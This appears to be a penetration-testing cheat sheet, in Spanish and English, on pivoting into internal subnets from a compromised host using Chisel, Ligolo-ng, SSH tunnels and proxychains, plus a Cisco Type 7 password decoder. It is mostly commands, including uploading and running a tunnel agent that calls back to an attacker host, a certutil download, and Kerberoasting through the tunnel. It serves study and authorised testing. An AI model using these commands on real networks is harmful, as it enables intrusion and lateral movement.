---
title: Network Pivoting (Chisel, Ligolo-ng, SSH)
slug: network-pivoting
category: techniques
updated: 2026-07-01
summary: "Chisel, Ligolo-ng, SSH tunneling, proxychains, subnet discovery"
tags: [pivot, chisel, ligolo, socks, tunnel, proxychains, port-forward]
sensitive: false
---

# Network Pivoting

## When to use
Necesitas alcanzar subredes internas (172.16.x.x, 192.168.x.x) desde Kali a través de un host comprometido con doble NIC. Usar ANTES de ataques cross-forest o cross-segment.

## Chisel (más fácil de desplegar)

### Servidor en Kali (method 1 — reverse)
```bash
# Kali (servidor):
chisel server --reverse --port 8080

# Target (cliente) — via CME o shell:
.\chisel.exe client KALI_IP:8080 R:socks
# O desde Linux:
./chisel client KALI_IP:8080 R:socks

# Resultado: SOCKS5 en 127.0.0.1:1080 en Kali
```

### Target como servidor (method 2)
```bash
# Target (servidor):
chisel server --socks5 --port 8080

# Kali (cliente):
chisel client TARGET_IP:8080 socks

# Resultado: SOCKS5 en 127.0.0.1:1080 en Kali
```

### Deploy chisel via NetExec
```bash
# Subir chisel al target y ejecutar via CME:
nxc smb TARGET -u U -p P --put-file chisel.exe C:\\Windows\\Temp\\chisel.exe
nxc smb TARGET -u U -p P -x "C:\Windows\Temp\chisel.exe client KALI_IP:8080 R:socks"
```

### Port forward específico
```bash
# Tunnel solo un puerto (ej. RDP interno 3389):
chisel client KALI_IP:8080 R:13389:INTERNAL_IP:3389
# Luego: xfreerdp /v:127.0.0.1:13389 /u:USER /p:PASS
```

## Ligolo-ng (más rápido, maneja rutas)

```bash
# Kali — proxy:
./proxy -selfcert -laddr 0.0.0.0:11601

# Target — agent (Linux):
./agent -connect KALI_IP:11601 -ignore-cert
# Target — agent (Windows):
.\agent.exe -connect KALI_IP:11601 -ignore-cert

# En la consola ligolo:
session              # listar y seleccionar sesión
start                # activar tunnel

# Agregar ruta en Kali:
sudo ip route add 172.16.139.0/24 dev ligolo
sudo ip route add 172.16.210.0/24 dev ligolo   # segunda subred

# Ahora acceder directamente (SIN proxychains):
nxc smb 172.16.139.3 -u U -p P
bloodhound-python -u U -p P -d DOMAIN -ns 172.16.139.3 -c All
```

## SSH Tunneling

```bash
# SOCKS5 dinámico (todas las conexiones):
ssh -D 127.0.0.1:1080 USER@PIVOT -N -f

# Local port forward (un servicio):
ssh -L 3306:INTERNAL_DB:3306 USER@PIVOT -N
# Luego: mysql -h 127.0.0.1 -P 3306 -u root

# Remote port forward (exponer servicio local a target):
ssh -R 4444:127.0.0.1:4444 USER@PIVOT -N
```

## Proxychains

```bash
# /etc/proxychains4.conf (añadir al final):
socks5 127.0.0.1 1080

# Usar con proxychains:
proxychains nmap -sT -Pn -p 22,80,445,3389 172.16.139.3
proxychains impacket-GetUserSPNs DOMAIN/U:P -dc-ip 172.16.139.3 -request

# ATENCION: Ligolo NO necesita proxychains — rutas directas
# ATENCION: ldapsearch + proxychains puede dar problemas; usar Ligolo para LDAP
```

## Descubrir subredes internas desde host comprometido
```bash
# Linux:
ip a; ip route
arp -a
ss -tlnp

# Windows:
ipconfig /all
route print
arp -a
netstat -ano
```

## Cisco Type 7 password decode (configs de red)
```bash
# Type 7 es XOR de clave fija, reversible (NO hashcat).
# Opción 1 — herramienta dedicada:
python3 ciscot7.py -d -p 023F544E280701607F1D5A1456
# Opción 2 — online: https://www.ifm.net.nz/cookbooks/passwordcracker.html
# Opción 3 — one-liner python (XOR contra el xlat fijo de Cisco):
python3 -c "
h='023F544E280701607F1D5A1456'
x='dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87'
s=int(h[:2])
print(''.join(chr(int(h[i:i+2],16)^ord(x[(s+(i-2)//2)%len(x)])) for i in range(2,len(h),2)))
"
```

## Gotchas
- Ligolo es preferible para subredes con múltiples targets (rutas IP directas vs socks proxy).
- Chisel method 1 (R:socks) requiere `--reverse` en el servidor; method 2 necesita puerto abierto en target.
- `proxychains` + `ldapsearch` = problemas de timeout; usar Ligolo + IP directa.
- Chisel SOCKS5 en 1080 por default; puede colisionar con Burp Proxy — cambiar puerto.
- Cross-forest: sin ruta de red hacia el DC externo, `-target-domain` da "name resolution failure" aunque el trust exista.
- Subir chisel/ligolo al target: `nxc smb --put-file`, `smbclient put`, o `certutil -urlcache -f`.

## References
- Relacionado: [[netexec-crackmapexec]], [[gtfobins-binaries]], [[active-directory-attacks]], [[service-enumeration]]
- Notas internas de CrackMapExec (sección Chisel).
- Notas de un host multi-NIC en lab interno.
- Notas de estudio.
